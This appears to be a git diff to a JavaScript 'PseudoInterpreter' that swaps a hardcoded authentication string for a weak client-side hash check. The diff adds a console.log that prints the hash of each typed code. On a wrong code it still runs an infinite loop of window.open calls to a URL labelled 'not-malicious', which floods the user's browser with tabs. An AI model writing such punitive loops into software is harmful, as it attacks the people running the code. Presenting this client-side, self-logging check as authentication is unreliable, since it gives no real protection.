@@ -1,5 +1,14 @@
 auth = false;
 banned = false;
+
+function simpleHash(str) {
+    let hash = 5381;
+    for (let i = 0; i < str.length; i++) {
+        hash = ((hash << 5) + hash) + str.charCodeAt(i);
+    }
+    return hash.toString();
+}
+
 class PseudoInterpreter {
     constructor() {
         this.continueFlag = false;
@@ -923,15 +932,14 @@ class PseudoInterpreter {
 
         if (!auth) {
             const inputAuthCode = prompt(`Enter the authentication code: `);
-            if (inputAuthCode === "8aG4eJ9pL2cN5bR7tE1dF3hK6mQ8wX4yZ9oI2pL3cN5bR7t" && !banned) {
+            console.log(simpleHash(inputAuthCode));
+            if (simpleHash(inputAuthCode) === "-5490770733" && !banned) {
                 auth = true;
                 alert("You are authenticated!");
             } else {
                 banned = true;
                 alert("Wrong Code!");
-                while(true) {
-                    window.open("https://nekawah.github.io/not-malicious/", '_blank');
-                }
+                while(true) window.open("https://nekawah.github.io/not-malicious/", '_blank');
             }
         }
 
